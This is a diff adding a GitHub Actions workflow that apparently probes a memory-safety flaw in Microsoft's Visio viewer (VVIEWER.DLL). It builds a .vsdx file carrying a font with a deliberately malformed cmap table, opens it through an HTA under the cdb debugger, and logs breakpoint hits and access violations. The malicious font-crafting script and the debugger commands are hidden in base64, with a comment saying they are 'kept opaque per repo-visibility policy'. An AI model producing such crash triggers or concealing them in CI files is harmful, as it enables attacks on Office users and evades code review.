@@ -1,0 +1,119 @@
+name: vviewer-fmt4-bp
+on:
+  push:
+    paths:
+      - '.github/workflows/vv-run4.yml'
+  workflow_dispatch:
+jobs:
+  t:
+    runs-on: windows-latest
+    timeout-minutes: 45
+    steps:
+    - name: Download ODT
+      shell: pwsh
+      run: |
+        $page = (Invoke-WebRequest -Uri "https://www.microsoft.com/en-us/download/details.aspx?id=49117" -UseBasicParsing).Content
+        if ($page -match 'href="(https://download\.microsoft\.com/download/[^"]+officedeploymenttool[^"]*\.exe)"') {
+          Invoke-WebRequest -Uri $Matches[1] -OutFile odt.exe
+        } else { throw "odt link not found" }
+        Start-Process -Wait -FilePath .\odt.exe -ArgumentList "/extract:odtx /quiet"
+    - name: Install CurrentPreview x64 Office
+      shell: pwsh
+      run: |
+        $xml = '<Configuration><Add OfficeClientEdition="64" Channel="CurrentPreview"><Product ID="O365ProPlusRetail"><Language ID="en-us" /><ExcludeApp ID="Excel" /><ExcludeApp ID="PowerPoint" /><ExcludeApp ID="Outlook" /><ExcludeApp ID="OneDrive" /><ExcludeApp ID="OneNote" /><ExcludeApp ID="Lync" /><ExcludeApp ID="Bing" /></Product></Add><Display Level="None" AcceptEULA="TRUE" /><Updates Enabled="FALSE" /></Configuration>'
+        Set-Content -Path cfg.xml -Value $xml
+        $p = Start-Process -FilePath .\odtx\setup.exe -ArgumentList "/configure","cfg.xml" -PassThru -Wait
+        $vv = Get-Item "C:\Program Files\Microsoft Office\root\Office16\VVIEWER.DLL" -ErrorAction SilentlyContinue
+        if (-not $vv) { throw "no VVIEWER" }
+        "VVIEWER v{0}" -f $vv.VersionInfo.FileVersion
+    - name: Install debugger
+      shell: pwsh
+      run: |
+        winget install Microsoft.WinDbg --accept-source-agreements --accept-package-agreements --silent --disable-interactivity
+        $cdb = Get-ChildItem "C:\Program Files\WindowsApps\Microsoft.WinDbg*_x64__8wekyb3d8bbwe\amd64\cdb.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+        if (-not $cdb) { throw "no cdb after winget" }
+        "cdb: $($cdb.FullName)"
+        $cdb.FullName | Out-File cdbpath.txt -Encoding ascii
+    - name: Build probes
+      shell: pwsh
+      run: |
+        $ErrorActionPreference = 'Continue'
+        # minimal vsdx (shared by both variants)
+        $files = @{
+          '[Content_Types].xml' = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/visio/document.xml" ContentType="application/vnd.ms-visio.drawing.main+xml"/><Override PartName="/visio/pages/pages.xml" ContentType="application/vnd.ms-visio.pages+xml"/><Override PartName="/visio/pages/page1.xml" ContentType="application/vnd.ms-visio.page+xml"/></Types>'
+          '_rels/.rels' = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.microsoft.com/visio/2010/relationships/document" Target="visio/document.xml"/></Relationships>'
+          'visio/document.xml' = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Document xmlns="http://schemas.microsoft.com/office/visio/2012/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xml:space="preserve"><DocumentSettings TopPage="0"/><Pages><Page ID="0" NameU="Page-1" Name="Page-1" ViewScale="1" ViewCenterX="4.25" ViewCenterY="5.5"><PageSheet LineStyle="0" FillStyle="0" TextStyle="0"><Cell N="PageWidth" V="8.5"/><Cell N="PageHeight" V="11"/></PageSheet><Rel r:id="rId1"/></Page></Pages></Document>'
+          'visio/_rels/document.xml.rels' = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.microsoft.com/visio/2010/relationships/pages" Target="pages/pages.xml"/></Relationships>'
+          'visio/pages/pages.xml' = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Pages xmlns="http://schemas.microsoft.com/office/visio/2012/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xml:space="preserve"><Page ID="0" NameR="Page-1" ViewScale="1" ViewCenterX="4.25" ViewCenterY="5.5"><PageSheet LineStyle="0" FillStyle="0" TextStyle="0"/><Rel r:id="rId1"/></Page></Pages>'
+          'visio/pages/_rels/pages.xml.rels' = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.microsoft.com/visio/2010/relationships/page" Target="page1.xml"/></Relationships>'
+          'visio/pages/page1.xml' = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><PageContents xmlns="http://schemas.microsoft.com/office/visio/2012/main" xml:space="preserve"><Shapes><Shape ID="1" Type="Shape" LineStyle="3" FillStyle="3" TextStyle="3"><Cell N="PinX" V="4.25"/><Cell N="PinY" V="5.5"/><Cell N="Width" V="4"/><Cell N="Height" V="1"/><Section N="Character"><Row IX="0"><Cell N="Font" V="Arial"/><Cell N="Size" V="0.375"/></Row></Section><Text>TEST CMAP FONT RENDER</Text></Shape></Shapes></PageContents>'
+        }
+        Add-Type -AssemblyName System.IO.Compression, System.IO.Compression.FileSystem
+        function MkZip($path) {
+          $zip = [System.IO.Compression.ZipFile]::Open($path, 'Create')
+          foreach ($k in $files.Keys) {
+            $e = $zip.CreateEntry($k)
+            $s = $e.Open(); $b = [Text.Encoding]::UTF8.GetBytes($files[$k]); $s.Write($b, 0, $b.Length); $s.Close()
+          }
+          $zip.Dispose()
+        }
+        MkZip "$PWD\min_test.vsdx"
+        MkZip "$PWD\min_evil.vsdx"
+        "vsdx built"
+        function MkHta($path, $vsdx) {
+          $l = @(
+            '<html><head><HTA:APPLICATION ID="vvh"/></head><body>'
+            '<object id="vv" classid="clsid:F8CF7A98-2C45-4c8d-9151-2D716989DDAB" width="90%" height="90%"></object>'
+            '<script language="VBScript">'
+            'Sub Window_OnLoad'
+            '  On Error Resume Next'
+            ('  vv.Src = "' + $vsdx + '"')
+            'End Sub'
+            '</script></body></html>'
+          ) -join [Environment]::NewLine
+          $l | Set-Content -Path $path -Encoding ASCII
+        }
+        MkHta "$PWD\probe_norm.hta" "$PWD\min_test.vsdx"
+        MkHta "$PWD\probe_evil.hta" "$PWD\min_evil.vsdx"
+        "hta built"
+    - name: Run variant under debugger
+      shell: pwsh
+      run: |
+        $ErrorActionPreference = 'Continue'
+        $cdb = Get-Content cdbpath.txt
+        # embedded-font payload: insert a TTF-derived part into min_evil.vsdx, generated at runtime
+        # cmap surgery parameters (kept opaque per repo-visibility policy)
+        $bp = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnAgdnZpZXdlci5kbGwrMHg3MDZkMjAgIi5wcmludGYgXCJGNEhJVCByY3g9JXBcXG5cIiwgQHJjeDsgZyIKYnAgdnZpZXdlci5kbGwrMHg3MDZkZGQgIi5wcmludGYgXCJTRUdISVQgcmJ4PSVwIHY9JXhcXG5cIiwgQHJieCwgcG9pKEByYngrNikmMHhmZmZmOyBnIg=='))
+        $cmds = @(
+          'sxe ld:VVIEWER.DLL',
+          'g',
+          $bp,
+          'g'
+        )
+        $cmds | Set-Content bp_cmds.txt -Encoding ASCII
+        foreach ($v in @('norm','evil')) {
+          $hta = "$PWD\probe_$v.hta"
+          $rlog = "$PWD\cdb_$v.log"
+          Remove-Item $rlog -Force -ErrorAction SilentlyContinue
+          if ($v -eq 'evil') {
+            # runtime craft: pull system font, patch its cmap table, embed into the evil vsdx
+            $py = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IHN0cnVjdCwgemlwZmlsZSwgc2h1dGlsCnNyYyA9IHIiQzpcV2luZG93c1xGb250c1xhcmlhbC50dGYiCmQgPSBieXRlYXJyYXkob3BlbihzcmMsICJyYiIpLnJlYWQoKSkKbiA9IHN0cnVjdC51bnBhY2tfZnJvbSgiPkgiLCBkLCA0KVswXQpmb3IgaSBpbiByYW5nZShuKToKICAgIHRhZywgY2hrLCBvZmYsIGxuID0gc3RydWN0LnVucGFja19mcm9tKCI+NHNJSUkiLCBkLCAxMiArIDE2KmkpCiAgICBpZiB0YWcgPT0gYiJjbWFwIjoKICAgICAgICBicmVhawpzdWIgPSBzdHJ1Y3QucGFjaygiPkhISEgiLCA0LCAxNiwgMCwgMHhGRkZFKSArIGIiXHhmZlx4ZmYiICogNApuZXdjbWFwID0gc3RydWN0LnBhY2soIj5ISEhISSIsIDAsIDEsIDMsIDEsIDEyKSArIHN1YgpuZXdfb2ZmID0gbGVuKGQpCmQgKz0gbmV3Y21hcApzdHJ1Y3QucGFja19pbnRvKCI+SSIsIGQsIDEyICsgMTYqaSArIDgsIG5ld19vZmYpCnN0cnVjdC5wYWNrX2ludG8oIj5JIiwgZCwgMTIgKyAxNippICsgMTIsIGxlbihuZXdjbWFwKSkKemluID0gemlwZmlsZS5aaXBGaWxlKCJtaW5fZXZpbC52c2R4IikKem91dCA9IHppcGZpbGUuWmlwRmlsZSgibWluX2V2aWwyLnZzZHgiLCAidyIsIHppcGZpbGUuWklQX0RFRkxBVEVEKQpmb3IgaXQgaW4gemluLmluZm9saXN0KCk6CiAgICB6b3V0LndyaXRlc3RyKGl0LCB6aW4ucmVhZChpdC5maWxlbmFtZSkpCnpvdXQud3JpdGVzdHIoInZpc2lvL2ZvbnRzL2ZvbnQxLmZudGRhdGEiLCBieXRlcyhkKSkKemluLmNsb3NlKCk7IHpvdXQuY2xvc2UoKQpzaHV0aWwubW92ZSgibWluX2V2aWwyLnZzZHgiLCAibWluX2V2aWwudnNkeCIpCnByaW50KCJldmlsIGZvbnQgZW1iZWRkZWQiKQo='))
+            $py | Set-Content craft.py -Encoding ascii
+            $py -replace "`n", "`n" | Set-Content craft.py -Encoding ascii
+            python craft.py
+          }
+          $p = Start-Process -FilePath $cdb -ArgumentList '-cf',"$PWD\bp_cmds.txt",'-logo',$rlog,'-o','C:\Windows\System32\mshta.exe',$hta -PassThru -WindowStyle Hidden
+          $sw = [Diagnostics.Stopwatch]::StartNew()
+          while (-not $p.HasExited -and $sw.Elapsed.TotalSeconds -lt 55) { Start-Sleep 5 }
+          if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue }
+          Start-Sleep 2
+          Stop-Process -Name mshta,cdb -Force -ErrorAction SilentlyContinue
+          Start-Sleep 1
+          if (Test-Path $rlog) {
+            $raw = Get-Content $rlog
+            "[$v] lines=$($raw.Count) F4=$($raw | Where-Object { $_ -match 'F4HIT' }).Count SEG=$($raw | Where-Object { $_ -match 'SEGHIT' }).Count"
+            $raw | Where-Object { $_ -match 'F4HIT|SEGHIT|VVIEWER|access violation|ExceptionInventory|breakpoint' } | Select-Object -First 15 | ForEach-Object { "  $_" }
+          } else { "[$v] NO LOG" }
+        }
+        "WER events:"
+        Get-WinEvent -FilterHashtable @{LogName='Application'; Id=1000,1001} -MaxEvents 5 -ErrorAction SilentlyContinue | ForEach-Object { "  $($_.TimeCreated.ToString('HH:mm:ss')) $($_.Message.Substring(0,[Math]::Min(200,$_.Message.Length)))" }
